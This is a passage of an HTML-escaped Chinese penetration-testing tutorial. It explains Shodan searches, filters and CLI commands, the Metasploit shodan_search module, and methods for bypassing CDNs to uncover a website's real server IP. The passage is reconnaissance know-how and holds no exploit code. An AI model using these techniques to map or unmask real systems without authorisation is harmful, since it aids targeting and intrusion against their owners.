class=\&quot;anchor-link\&quot; href=\&quot;#shodan的使用\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;我们在左上角输入我们要搜索的关键字，然后下面就出来搜索结果了。比如我们搜索 SSH\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/2.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n上图的搜索结果包含两个部分，左侧是大量的汇总数据包括：&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Results map – 搜索结果展示地图&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Top services (Ports) – 使用最多的服务/端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Top organizations (ISPs) – 使用最多的组织/ISP&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Top operating systems – 使用最多的操作系统&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Top products (Software name) – 使用最多的产品/软件名称&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;随后，在中间的主页面我们可以看到包含如下的搜索结果：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;IP 地址&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;主机名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ISP&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;该条目的收录收录时间&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;该主机位于的国家&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Banner 信息&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;想要了解每个条目的具体信息，只需要点击每个条目下方的 details 按钮即可。\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/3.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;我们还可以点击 Exploits ，Shodan 就会帮我们查找针对不同平台、不同类型可利用的 exploits。当然也可以通过直接访问网址来自行搜索：&lt;a href=\&quot;https://exploits.shodan.io/welcome%EF%BC%9B\&quot;&gt;https://exploits.shodan.io/welcome；&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/4.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;我们还可以点击Maps，查看设备分布的地图\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/5.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;如果我们想生成报表，我们可以点击Create Report\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/6.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;我们还可以直接点击 Explore ，看网络上其他用户使用最多的搜索\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/7.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n如果像前面单纯只使用关键字直接进行搜索，搜索结果可能不尽人意，那么此时我们就需要使用一些特定的命令对搜索结果进行过滤。&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;使用搜索过滤\&quot;&gt;使用搜索过滤&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#使用搜索过滤\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hostname：搜索指定的主机或域名，例如hostname:\&quot;google\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;port：搜索指定的端口或服务，例如port:\&quot;21\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;country：搜索指定的国家，例如country:\&quot;CN\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;city：搜索指定的城市，例如city:\&quot;Hefei\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;org：搜索指定的组织或公司，例如org:\&quot;google\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;isp：搜索指定的ISP供应商，例如isp:\&quot;China Telecom\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;product：搜索指定的操作系统/软件/平台，例如product:\&quot;Apache httpd\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;version：搜索指定的软件版本，例如 version:\&quot;1.6.2\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;geo：搜索指定的地理位置，参数为经纬度，例如 geo:\&quot;31.8639, 117.2808\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;before/after：搜索指定收录时间前后的数据，格式为 dd-mm-yy，例如 before:\&quot;11-11-15\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net：搜索指定的IP地址或子网，例如 net:\&quot;210.45.240.0/24\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Kali中安装 Shodan&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Shodan 是由官方提供的 Python 库&lt;/p&gt;\n&lt;h2 id=\&quot;kali中安装-shodan\&quot;&gt;Kali中安装 Shodan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#kali中安装-shodan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Shodan 是由官方提供的 Python 库&lt;/p&gt;\n&lt;p&gt;安装命令：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;git clone https://github.com/achillean/shodan-python.git &amp;#x26;&amp;#x26; cd shodan-python&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python setup.py install&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;kali中shodan的使用\&quot;&gt;Kali中Shodan的使用&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#kali中shodan的使用\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;官方用法：Shodan Command-Line Interface\nCommands:&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;alert Manage the network alerts for your account # 管理账户的网络提示&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;convert Convert the given input data file into a... # 转换输入文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;count Returns the number of results for a search # 返回查询结果数量&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;download Download search results and save them in a... # 下载查询结果到文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;honeyscore Check whether the IP is a honeypot or not. # 检查 IP 是否为蜜罐&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;host View all available information for an IP... # 显示一个 IP 所有可用的详细信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;info Shows general information about your account # 显示账户的一般信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;init Initialize the Shodan command-line # 初始化命令行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;myip Print your external IP address # 输出用户当前公网IP&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;parse Extract information out of compressed JSON... # 解析提取压缩的JSON信息，即使用download下载的数据&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;scan Scan an IP/ netblock using Shodan. # 使用 Shodan 扫描一个IP或者网段&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;search Search the Shodan database # 查询 Shodan 数据库&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;stats Provide summary information about a search... # 提供搜索结果的概要信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;stream Stream data in real-time. # 实时显示流数据&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;初始化Shodan：shodan init API_Key&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;返回查询结果的数量：shodan  count  SSH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;将查询到的结果下载：shodan download microsoft-data microsoft iis 6.0 。将搜索结果下载到  microsoft-data 文件中，文件中的每一行都是 JSON 格式存储的目标 banner 信息。默认情况下，该命令只会下载 100 条结果。如果我们想获取更多的结果，需要我们花钱注册，然后下载的时候指定—limit参数。\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/8.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n解析下载的数据：shodan parse —fields ip_str,port,org —separator , microsoft-data.json.gz\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/9.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;查看指定主机的相关信息，如地理位置信息，开放端口，甚至是否存在某些漏洞等信息。\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/10.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nshodan search microsoft iis 6.0\nsearch查找，直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/11.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;当然我们也可以通过使用 –fields 来自定义显示内容，例如，我们只显示IP、端口号、组织名称和主机名：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/12.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;msf中使用shodan\&quot;&gt;MSF中使用Shodan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#msf中使用shodan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;use auxiliary/gather/shodan_search #使用shodan模块&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set shodan_apikey xxxxxxxx #设置shodan的API&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set query JAWS/1.0 #设置查询词&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;exploit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/13.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;域名信息收集\&quot;&gt;域名信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#域名信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;通过域名查询ip\&quot;&gt;通过域名查询IP&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#通过域名查询ip\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;查询网站\&quot;&gt;查询网站&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#查询网站\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;使用不同地方的 ping 服务，查看对应 IP 地址是否唯一，如果不唯一则极有可能是使用了CDN&lt;/p&gt;\n&lt;p&gt;ping测试网站有：\n&lt;a href=\&quot;https://wepcc.com/\&quot;&gt;https://wepcc.com/&lt;/a&gt;\n&lt;a href=\&quot;http://ping.chinaz.com/\&quot;&gt;http://ping.chinaz.com/&lt;/a&gt;\n&lt;a href=\&quot;http://ping.aizhan.com/\&quot;&gt;http://ping.aizhan.com/&lt;/a&gt;&lt;/p&gt;\n&lt;h3 id=\&quot;什么是cdn\&quot;&gt;什么是CDN&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#什么是cdn\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;在渗透测试过程中，经常会碰到网站有CDN的情况。CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说的简单点，就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。&lt;/p&gt;\n&lt;h4 id=\&quot;2113-cdn的优势\&quot;&gt;2.1.1.3 CDN的优势&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#2113-cdn的优势\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h4&gt;\n&lt;p&gt;提高用户访问速率，优化用户使用体验。\n隐藏真实服务器的IP\n提供WAF功能，目前很多CDN也提供了WAF的功能，我们的访问请求会先经过CDN节点的过滤，该过滤可对SQL注入、XSS、Webshell上传、命令注入、恶意扫描等攻击行为进行有效检测和拦截。CDN节点将认为无害的数据提交给真实的主机服务器。&lt;/p&gt;\n&lt;h3 id=\&quot;几种访问方式的不同\&quot;&gt;几种访问方式的不同&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#几种访问方式的不同\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;传统访问：用户访问域名—&gt;解析服务器IP—&gt;访问目标主机\n普通CDN：用户访问域名—&gt;CDN节点—&gt;真实服务器IP—&gt;访问目标主机\n带WAF的CDN：用户访问域名—&gt;CDN节点（云WAF）—&gt;真实服务器IP—&gt;访问目标主机&lt;/p&gt;\n&lt;h3 id=\&quot;cdn的配置\&quot;&gt;CDN的配置&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#cdn的配置\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;将域名的 NS 记录指向 CDN 厂商提供的 DNS 服务器。\n给域名设置一个 CNAME 记录，将它指向CDN厂商提供的另一个域名。\n所以在渗透测试中，为了要知道网站服务器的真实IP，我们必须绕过CDN查找出网站的真实ip地址。\n查询域名相关的网站：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;DNS查询：&lt;a href=\&quot;https://dnsdb.io/zh-cn/\&quot;&gt;https://dnsdb.io/zh-cn/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;微步在线：&lt;a href=\&quot;https://x.threatbook.cn/\&quot;&gt;https://x.threatbook.cn/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;在线域名信息查询：&lt;a href=\&quot;http://toolbar.netcraft.com/site_report?url=\&quot;&gt;http://toolbar.netcraft.com/site_report?url=&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;DNS、IP等查询：&lt;a href=\&quot;http://viewdns.info/\&quot;&gt;http://viewdns.info/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;CDN查询IP：&lt;a href=\&quot;https://tools.ipip.net/cdn.php\&quot;&gt;https://tools.ipip.net/cdn.php&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;SecurityTrails平台：&lt;a href=\&quot;https://securitytrails.com/domain/www.baidu.com/history/a\&quot;&gt;https://securitytrails.com/domain/www.baidu.com/history/a&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=\&quot;绕过cdn的方法\&quot;&gt;绕过CDN的方法&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#绕过cdn的方法\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;查询子域名\&quot;&gt;查询子域名&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#查询子域名\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;通过爆破子域名进行查询，如 Layer子域名爆破机、subDomainBrute，在线子域名查询网站：&lt;a href=\&quot;https://phpinfo.me/domain/\&quot;&gt;https://phpinfo.me/domain/&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;通过查询DNS服务器，查询该域下的解析记录&lt;/p&gt;\n&lt;p&gt;通过HTTPS证书来查询(只适用于https网站) ，如：&lt;a href=\&quot;https://crt.sh/%E5%B0%B1%E6%98%AF%E9%80%9A%E8%BF%87https%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2%E5%AD%90%E5%9F%9F%E5%90%8D\&quot;&gt;https://crt.sh/就是通过https证书查询子域名&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;通过google查询&lt;/p&gt;\n&lt;h3 id=\&quot;查询主域名\&quot;&gt;查询主域名&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#查询主域名\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不适用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了，您别说，这个方法还真是屡用不爽。&lt;/p&gt;\n&lt;h3 id=\&quot;邮件服务器\&quot;&gt;邮件服务器&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#邮件服务器\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。&lt;/p&gt;\n&lt;h3 id=\&quot;查看域名历史解析记录\&quot;&gt;查看域名历史解析记录&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#查看域名历史解析记录\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站&lt;a href=\&quot;https://www.netcraft.com\&quot;&gt;https://www.netcraft.com&lt;/a&gt; 来观察域名的IP历史记录。&lt;/p&gt;\n&lt;h4 id=\&quot;国外访问\&quot;&gt;国外访问&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#国外访问\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h4&gt;\n&lt;p&gt;国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站&lt;a href=\&quot;https://asm.ca.com/en/ping.php\&quot;&gt;https://asm.ca.com/en/ping.php&lt;/a&gt; 访问 ，可能会得到真实的ip地址。&lt;/p&gt;\n&lt;h3 id=\&quot;nslookup查询\&quot;&gt;Nslookup查询&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nslookup查询\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。\n各种解析记录&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;A 主机记录，记录域名对应的ip&lt;/li&gt;\n&lt;li&gt;PTR 反向地址解析记录，记录ip对应的域名&lt;/li&gt;\n&lt;li&gt;CNAME 别名记录&lt;/li&gt;\n&lt;li&gt;MX 